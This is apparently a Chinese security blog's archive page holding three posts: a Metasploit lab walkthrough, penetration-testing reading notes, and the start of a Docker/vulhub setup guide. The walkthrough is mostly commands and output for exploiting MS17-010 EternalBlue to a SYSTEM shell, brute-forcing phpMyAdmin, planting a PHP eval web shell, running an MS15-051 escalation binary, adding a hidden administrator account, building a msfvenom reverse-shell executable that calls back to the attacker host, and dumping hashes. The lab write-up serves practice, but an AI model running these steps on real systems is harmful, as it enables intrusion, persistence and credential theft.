title="实验步骤"></a>实验步骤</h2><h3 id="根据名称搜索"><a href="#根据名称搜索" class="headerlink" title="根据名称搜索"></a>根据名称搜索</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search ms17</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash">  Name                                                  Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -   ----                                                  ---------------  ----     -----  -----------</span><br><span class="line">   0   exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average  Yes    MS17-01</span><br></pre></td></tr></table></figure><h3 id="设置模块"><a href="#设置模块" class="headerlink" title="设置模块"></a>设置模块</h3><p>其中有exp和aux，我们先用aux进行扫描，看是否存在漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; </span><br><span class="line">也可以use+序号</span><br><span class="line">use 24</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting             Required  Description</span><br><span class="line">   ----         ---------------             --------  -----------</span><br><span class="line">   CHECK_ARCH   true                        no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                        no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                       no        Check for named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-fram  yes       List of named pipes to check</span><br><span class="line">                ework/data/wordlists/named</span><br><span class="line">                _pipes.txt</span><br><span class="line">   RHOSTS                                   yes       The target host(s), see https://docs.metasplo</span><br><span class="line">                                                      it.com/docs/using-metasploit/basics/using-met</span><br><span class="line">                                                      asploit.html</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>yes的是需要设置的，no可以不用设置，有些事给你填好的</p><p>RHOST：目标地址（remote）</p><p>LHOST：本地地址</p><h3 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h3><p>端口扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; db_nmap -p 445 192.168.174.157</span><br><span class="line">[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-21 12:43 CST</span><br><span class="line">[*] Nmap: Nmap scan report for 192.168.174.157</span><br><span class="line">[*] Nmap: Host is up (0.00036s latency).</span><br><span class="line">[*] Nmap: PORT    STATE SERVICE</span><br><span class="line">[*] Nmap: 445/tcp open  microsoft-ds</span><br><span class="line">[*] Nmap: MAC Address: 00:0C:29:4E:42:2E (VMware)</span><br><span class="line">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.19 seconds</span><br></pre></td></tr></table></figure><p>漏洞扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOST 192.168.174.157</span><br><span class="line">RHOST =&gt; 192.168.174.157</span><br></pre></td></tr></table></figure><p>如果之前有用db_namp扫描过，可以直接从hosts中读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hosts -R</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.174.157:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.174.157:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>返回信息提示有可能存在漏洞</p><h3 id="攻击靶机"><a href="#攻击靶机" class="headerlink" title="攻击靶机"></a>攻击靶机</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">利用攻击模块</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/do</span><br><span class="line">                                             cs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use for authenticatio</span><br><span class="line">                                             n. Only affects Windows Server 2008 R2, Windows 7, Win</span><br><span class="line">                                             dows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. O</span><br><span class="line">                                             nly affects Windows Server 2008 R2, Windows 7, Windows</span><br><span class="line">                                              Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affect</span><br><span class="line">                                             s Windows Server 2008 R2, Windows 7, Windows Embedded</span><br><span class="line">                                             Standard 7 target machines.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.174.137  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里用hosts设置试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac           name          os_name       os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---           ----          -------       ---------  -----  -------  ----  --------</span><br><span class="line">192.168.174  00:0C:29:4E:  WIN-R4FJ4HCK  Windows Serv  Standard   SP1    server</span><br><span class="line">.157         42:2E         TF1           er 2008 R2</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; hosts -R</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac           name          os_name       os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---           ----          -------       ---------  -----  -------  ----  --------</span><br><span class="line">192.168.174  00:0C:29:4E:  WIN-R4FJ4HCK  Windows Serv  Standard   SP1    server</span><br><span class="line">.157         42:2E         TF1           er 2008 R2</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 192.168.174.157</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         192.168.174.157  yes       The target host(s), see https://docs.metasploit.com/do</span><br><span class="line">                                             cs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="选择payload"><a href="#选择payload" class="headerlink" title="选择payload"></a>选择payload</h3><p>因为漏洞的利用有不同的目的，也有不同的方式，我们这里就要选择自己需要的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads</span><br><span class="line"></span><br><span class="line">Compatible Payloads</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   #   Name                                                Disclosure Date  Rank    Check  Description</span><br><span class="line">   -   ----                                                ---------------  ----    -----  -----------</span><br><span class="line">   0   payload/generic/custom                              .                normal  No     Custom Payload</span><br><span class="line">   1   payload/generic/shell_bind_aws_ssm                  .                normal  No     Command Shell, Bind SSM (via AWS API)</span><br><span class="line">   2   payload/generic/shell_bind_tcp                      .                normal  No     Generic Command Shell, Bind TCP Inline</span><br><span class="line">   3   payload/generic/shell_reverse_tcp                   .                normal  No     Generic Command Shell, Reverse TCP Inline</span><br></pre></td></tr></table></figure><p>这里我们用reverse的，也就是反弹shell，而bind是正向的，目标服务器可能不一定支持我们去连接他，所以我们需要让他主动来连接我们，于是选择反弹shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.174.137:4444 </span><br><span class="line">[*] 192.168.174.157:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.174.157:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.174.157:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.174.157:445 - The target is vulnerable.</span><br><span class="line">[*] 192.168.174.157:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.174.157:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.174.157:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.174.157:445 - CORE raw buffer dump (51 bytes)</span><br><span class="line">[*] 192.168.174.157:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2</span><br><span class="line">[*] 192.168.174.157:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard </span><br><span class="line">[*] 192.168.174.157:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac</span><br><span class="line">[*] 192.168.174.157:445 - 0x00000030  6b 20 31                                         k 1             </span><br><span class="line">[+] 192.168.174.157:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.174.157:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.174.157:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] Sending stage (201798 bytes) to 192.168.174.157</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.174.137:4444 -&gt; 192.168.174.157:49163) at 2024-05-21 12:50:03 +0800</span><br><span class="line">[-] 192.168.174.157:445 - RubySMB::Error::CommunicationError: RubySMB::Error::CommunicationError</span><br></pre></td></tr></table></figure><p>等待一会后，会进入后渗透模块meterpreter，可以使用getuid，来查看当前用户所属的权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h2 id="实验环境二"><a href="#实验环境二" class="headerlink" title="实验环境二"></a>实验环境二</h2><p>创建低权限用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user qaq 123abc. /add</span><br><span class="line">net user 查看是否创建成功</span><br></pre></td></tr></table></figure><p>修改phpstudy进程的所有者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务-&gt;找到apache2进程-&gt;停止-&gt;属性-&gt;登录-&gt;此账户-&gt;浏览-&gt;找到qaq，输入密码应用即可</span><br></pre></td></tr></table></figure><p>但启动时会报错，因为阿帕奇的log文件夹会记录apache的信息，我们需要给这个文件赋予qaq写权限，然后重启相关服务即可，访问主页试试</p><p><img src="/../image/image-20240521173640201.png" alt="image-20240521173640201"></p><p>进入phpmyadmin页面</p><p><img src="/../image/image-20240521173736035.png" alt="image-20240521173736035"></p><h3 id="扫描靶机-1"><a href="#扫描靶机-1" class="headerlink" title="扫描靶机"></a>扫描靶机</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search phpmyadmin</span><br><span class="line">use 1</span><br><span class="line">options #要设置三个东西</span><br><span class="line">set rhost 192.168.174.1257</span><br><span class="line">set targeturi /phpMyAdmin-4.8.1/</span><br><span class="line">set userpass_file small.txt设置密码字典</span><br><span class="line">##用户名也可以设置字典爆破</span><br><span class="line">---------------------------------</span><br><span class="line">字典可以在文件中找</span><br><span class="line">locate small.txt</span><br><span class="line">cp path /root</span><br></pre></td></tr></table></figure><p>使用这个模块就算密码正确有时候也会失败，不好用，不如bp</p><h3 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search phpmyadmin</span><br><span class="line">use 8</span><br><span class="line">根据前面爆破出来的密码设置即可</span><br><span class="line">run</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: qaq</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer    : WIN-R4FJ4HCKTF1</span><br><span class="line">OS          : Windows NT WIN-R4FJ4HCKTF1 6.1 build 7601 (Windows Server 2008 R2 Standard Edition Service Pack 1) i586</span><br><span class="line">Meterpreter : php/windows</span><br><span class="line">meterpreter &gt; getwd</span><br><span class="line">C:\phpStudy\WWW\phpMyAdmin-4.8.1</span><br></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在线比对补丁查找exp：<a href="https://bugs.hacking8.com/tiquan/%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%BF%99%E4%B8%AA%E6%98%AF%E6%A0%B9%E6%8D%AEsysinfo%E7%9A%84%E4%BF%A1%E6%81%AF%E6%9F%A5%E6%89%BE%E7%9A%84%EF%BC%8C%E4%BD%86meterpreter%E6%B2%A1%E6%9C%89%EF%BC%8C%E9%9C%80%E8%A6%81%E6%8D%A2%E4%B8%AA%E5%B7%A5%E5%85%B7">https://bugs.hacking8.com/tiquan/，因为这个是根据sysinfo的信息查找的，但meterpreter没有，需要换个工具</a></p><p>写木马,用antsword连</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edit 1.php</span><br><span class="line">&lt;?php eval($_REQUEST[123]) ?&gt;</span><br><span class="line">meterpreter &gt; ls 1.php</span><br><span class="line">100666/rw-rw-rw-  128849018910  fil  233591561222-02-03 07:15:02 +0800  1.php</span><br></pre></td></tr></table></figure><p>验证一下，访问这个页面，传一个phpinfo（）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.157/phpMyAdmin-4.8.1/1.php?123=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240521210535033.png" alt="image-20240521210535033"></p><p>蚁🗡连接</p><p><img src="/../image/image-20240521213257467.png" alt="image-20240521213257467"></p><p>进入命令界面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240521213446704.png" alt="image-20240521213446704"></p><p>利用补丁号更具操作系统类型，查找exp，究竟哪一个有用，要我们一个一个去试</p><h3 id="MS15-051-KB3045171"><a href="#MS15-051-KB3045171" class="headerlink" title="MS15-051-KB3045171"></a>MS15-051-KB3045171</h3><p>在文件里右键上传即可</p><p><img src="/../image/image-20240521213819003.png" alt="image-20240521213819003"></p><p>最好重命名一下，方便利用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc.exe whami</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240521214025522.png" alt="image-20240521214025522"></p><p>这时候就是系统权限的用户了，添加用户进入管理组,后续就可以利用这个用户进行渗透，也有一种隐藏用户，不容易被发现</p><p><a href="https://blog.csdn.net/weixin_40412037/article/details/123478562">https://blog.csdn.net/weixin_40412037/article/details/123478562</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc.exe net user a a.1 /add#添加用户</span><br><span class="line"></span><br><span class="line">net localgroup administrators a /add  #添加用户至管理组</span><br></pre></td></tr></table></figure><h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>上传一个属于meterpreter的木马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先拿一个msf的session，另开一个</span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.174.137 lport=1234 -f exe  &gt; shell.exe </span><br></pre></td></tr></table></figure><p>OS&#x2F;几位&#x2F;后渗透模块的反弹shell&#x2F;监听地址和端口，文件类型</p><p>进入meterpreter加载exe</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload shell.exe</span><br><span class="line">[*] Uploading  : /root/shell.exe -&gt; shell.exe</span><br><span class="line">[*] Uploaded -1.00 B of 203.50 KiB (-0.0%): /root/shell.exe -&gt; shell.exe</span><br><span class="line">[*] Completed  : /root/shell.exe -&gt; shell.exe</span><br><span class="line">meterpreter &gt; ls shell.exe</span><br><span class="line">100777/rwxrwxrwx  895002465218048  fil  233592092020-04-06 21:40:02 +0800  shell.exe</span><br><span class="line">#rwx有可执行权限</span><br></pre></td></tr></table></figure><p>新开一个监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">#不用默认的payload，去复制木马的payload</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter_reverse_tcp</span><br><span class="line">#option设置一下</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 192.168.174.137</span><br><span class="line">LHOST =&gt; 192.168.174.137</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 1234</span><br><span class="line">LPORT =&gt; 1234</span><br></pre></td></tr></table></figure><p>meterpreter</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; execute -f shell.exe</span><br><span class="line">Process 1368 created.</span><br></pre></td></tr></table></figure><p>获得shell后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">[-] priv_passwd_get_sam_hashes: Operation failed: 1168</span><br></pre></td></tr></table></figure><p>这里报错是权限不够，而不是没有这个命令</p><h3 id="msf提权模块"><a href="#msf提权模块" class="headerlink" title="msf提权模块"></a>msf提权模块</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#use post/multi/recon/local_exploit_suggester</span><br><span class="line">#Msf里能够提权的模块还有很多如use exploit/windows/local/ms16_016_webdav （可能需要使用migrate迁移一下进程）</span><br><span class="line">#先把会话放在后台</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 16...</span><br><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line">options</span><br><span class="line">设置下会话，可以用sessions命令查看</span><br></pre></td></tr></table></figure><p>这个会返回很多的可用payload，需要一个一个测试</p>]]></content>
      
      
      
        <tags>
            
            <tag> msf </tag>
            
            <tag> ms17_010 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些读书笔记</title>
      <link href="/2024/05/19/%E4%B8%80%E4%BA%9B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/05/19/%E4%B8%80%E4%BA%9B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="读书笔记"><a href="#读书笔记" class="headerlink" title="读书笔记"></a>读书笔记</h1><p>主要是记录一些常识</p><h2 id="msf篇"><a href="#msf篇" class="headerlink" title="msf篇"></a>msf篇</h2><p><strong>渗透测试</strong>：是一种通过模拟恶意攻击者的技术与方法，挫败目标系统安全控制措施，取得访问控制权，并发现具备业务影响后果安全隐患的一种安全测试与评估方式。</p><p>渗透测试的<strong>分类</strong>:黑盒和白盒、灰盒（白+黑）</p><p>一定的测试流程：</p><ol><li>安全测试方法学开源手册</li><li>NIST SP 800-42网络安全测试指南</li><li>OWASP top 10</li><li>Web安全威胁分类标准</li><li>PTES</li></ol><p>着重记一下PTES，认同度比较高</p><p><strong>七个阶段</strong>：前期交互、情报搜集、威胁建模（团队brain storm）、漏洞分析、渗透攻击、后渗透攻击、报告</p><p><strong>安全漏洞的生命周期</strong>：</p><pre><code>1. 研究与发掘1. exp开发与测试1. 漏洞和exp在封闭团队中流传1. 扩散开了1. 恶意程序出现开始传播1. 大规模传播并危害互联网1. 逐渐消亡</code></pre><p><img src="/../image/image-20240519203316672.png" alt="image-20240519203316672"></p><p>​也就是我们说的0day，1day之类的</p><p><strong>0day：</strong>从发现到补丁，传播一段时间后就是1day了</p><p><strong>漏洞也有买卖、地下经济链，No more free bug</strong></p><p><strong>安全漏洞公共资源库</strong>：</p><ol><li>CNNVD 中国国家漏洞库</li><li>CNVD 中国国家信息安全漏洞共享平台</li><li>乌云（民间组织）</li><li>SCAP</li><li>CVE 通用漏洞与披露</li><li>NVD 国家漏洞数据库（美）</li><li>securityfocus</li><li>OSVDB msf作者发起的</li></ol><p><strong>渗透攻击的代码获取</strong></p><p>msf应该就是最好的了，但也有其它的，付费或者免费的都有1337day就是付费的</p><p><img src="/../image/image-20240519203914970.png" alt="image-20240519203914970"></p><p><strong>好多插件：</strong></p><p>Nessus、OpenVAS、SET、FAast Track、Karmetasploit等</p><p>Nessus 是一款广泛使用的网络<a href="https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7&spm=1001.2101.3001.7020">漏洞扫描工具</a>。它由 Tenable Network Security 公司开发，旨在帮助组织评估其计算机系统和网络的安全性。</p><p>OpenVas是一款开源的漏洞扫描工具，是Nessus项目分支，检测目标网络或主机的安全性。现基于B&#x2F;S(浏览器&#x2F;服务器)架构进行工作，执行扫描并提供扫描结果。</p><p> Kali–social engineering toolkit（SET）<a href="https://blog.csdn.net/m0_68012373/article/details/125564443">https://blog.csdn.net/m0_68012373/article/details/125564443</a></p><p>Fast-Track是Backtrack工具里面自带的渗透工具，在现代的渗透测试过程中体现出了她所拥有的强大的威力，同时也对安全人员带来了很大的压力。</p><p><img src="/../image/image-20240519205417745.png" alt="image-20240519205417745">ss</p><p>基础库：RRex fw-core、fw-base</p><p>四个模块：aux、exp、payload、post、encoders</p><p>SCADA工业控制系统服务渗透攻击</p><p><strong>主动渗透攻击</strong>所利用的安全漏洞位于网络服务端软件与服务承载的上层应用程序之中，</p><p><strong>被动渗透攻击</strong>利用的安全漏洞位于客户端软件中，如浏览器、浏览器插件、电子邮件客户端、Office与Adobe等各种文档阅读与编辑软件。</p><p><strong>保护机制</strong>：Windows7等新型操作系统所引人的NX(堆栈不可执行)、DEP(数据执行保护)，可以通过控制payload绕过</p><p>空指令：在x86CPU体系架构平台上的操作码是 0x90.在渗透攻击构造邪恶数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区，这样当触发渗透攻击后跳转执行Shellcode 时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的Shellcode执行失败，提高渗透攻击的可靠性。Metasploit框架中的空指令模块就是用来在攻击载荷中添加空指令区，以提高攻击可靠性的组件。</p><p><strong>编码器模块</strong>的第一个使命是确保攻击载荷中不会出现渗透攻击过程中应加以避免的“坏字符”，这些“坏字符”的存在将导致特殊构造的邪恶数据缓冲区无法按照预期目标完成，典型的就是0x00</p><p>第二个就是免杀</p><h1 id="Linux之Xinetd服务介绍"><a href="#Linux之Xinetd服务介绍" class="headerlink" title="Linux之Xinetd服务介绍"></a><a href="https://blog.csdn.net/lzghxjt/article/details/83018710">Linux之Xinetd服务介绍</a></h1><p>win的administrator的默认密码是空</p><p>win安全策略：</p><p>系统创建时会默认创建一个guest用户，该账户权限很低，但也可以被黑客利用提权到管理员权限带来进一步危害</p><p>可以通过计算机管理的本地用户和组策略里禁用了</p><p>局域网共享资源</p><p>批处理启动法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net share ipc$ /delete</span><br><span class="line">net share admin$ /delete</span><br><span class="line">net share c$ /delete</span><br></pre></td></tr></table></figure><p>还有侠客密码星号查看器这种东西</p><p>NTFS还比fat32更安全，在winxp中fat32无论什么权限的用户都可以对fat32分区下的资源进行任何操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win + r shrpubw创建共享文件夹</span><br></pre></td></tr></table></figure><p>UPNP服务漏洞，面向无线设备等提供网络连接，用于检测和集成UPNP硬件</p><p>升级程序漏洞：比如winxp升xppro，会重装ie，之前ie的补丁会被清楚</p><p>帮助和支持中心漏洞，这些页面可能被利用删除文件</p><p>rdp漏洞，vm漏洞，热键，账号快速切换</p><p>winserver攻击思路</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">139(SMB)进入共享磁盘-&gt;IPC$管道入侵-&gt;IIS漏洞-&gt;缓冲区溢出-&gt;Serv-U（FTPSer）-&gt;木马等脚本DDOS-&gt;开启后门</span><br></pre></td></tr></table></figure><p>IIS常见漏洞：</p><p>① Null.htw，暴露源代码</p><p>② MDAC-RCE</p><p>③ idc&amp;.ida漏洞</p><p>④ +.htr</p><p>⑤ NTSite Server Adsamples</p><p>⑥ IIS HACk 缓冲区溢出</p><p>⑦ Webhits.dll &amp; .htw</p><p>⑧ ASP ::$DATA(文件上传有提到这个)</p><p>⑨ ISM.d</p>]]></content>
      
      
      
        <tags>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali+docker+vulhub</title>
      <link href="/2024/04/28/kali-docker-vulhub/"/>
      <url>/2024/04/28/kali-docker-vulhub/</url>
      
        <content type="html"><![CDATA[<h1 id="vulhub环境搭建"><a href="#vulhub环境搭建" class="headerlink" title="vulhub环境搭建"></a><a href="https://www.freebuf.com/vuls/282626.html">vulhub环境搭建</a></h1><h2 id="安装证书环境"><a href="#安装证书环境" class="headerlink" title="安装证书环境"></a>安装证书环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#记得配下源 编辑 /etc/apt/source.list</span></span><br><span class="line">apt-update</span><br><span class="line"><span class="comment">#安装https和ca证书</span></span><br><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br><span class="line"><span class="comment">#dirmngr</span></span><br><span class="line">apt-get install dirmngr</span><br></pre></td></tr></table></figure><p>补充知s识<a href="https://docs.oracle.com/cd/E75432_01/html/E72378/dirmngr-8.html">dirmngr</a></p><h2 id="添加GPG密钥并添加更新源"><a href="#添加GPG密钥并添加更新源" class="headerlink" title="添加GPG密钥并添加更新源"></a>添加GPG密钥并添加更新源</h2><p>获取指定URL的GPG（GNU Privacy Guard）密钥，并使用<code>apt-key</code>命令将其添加到密钥环中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><ul><li><code>curl</code>：这是一个命令行工具，用于使用各种支持的协议从服务器传输数据。</li><li><code>-fsSL</code>:这些是传递给curl的命令的选项：<ul><li><code>-f</code>：它告诉<code>curl</code>在请求失败时静默失败，不生成任何输出。</li><li><code>-s</code>：它使<code>curl</code>以静默模式运行，不显示任何进度或错误消息。</li><li><code>-S</code>：如果发生错误，它强制<code>curl</code>显示错误消息。</li><li><code>-L</code>：它指示<code>curl</code>在服务器响应重定向时跟随重定向。</li></ul></li><li><code>https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg</code>：这是要获取的GPG密钥的URL。在这种情况下，它是清华大学镜像上托管的Docker CE（Community Edition）仓库的GPG密钥文件的URL。</li><li><code>sudo apt-key add -</code>：此命令将从<code>curl</code>接收到的GPG密钥添加到系统的密钥环中。末尾的<code>-</code>表示从标准输入读取GPG密钥。</li></ul><p><img src="/../image/image-20240428234738195.png" alt="image-20240428234738195"></p><p>将指定的软件源行添加到<code>/etc/apt/sources.list.d/docker.list</code>文件中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27; | sudo tee /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure><p>让我们逐个解释命令及其组成部分：</p><ul><li><code>echo</code>: 这是一个命令，用于将参数中的文本内容输出到标准输出（终端）。</li><li><code>&#39;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#39;</code>: 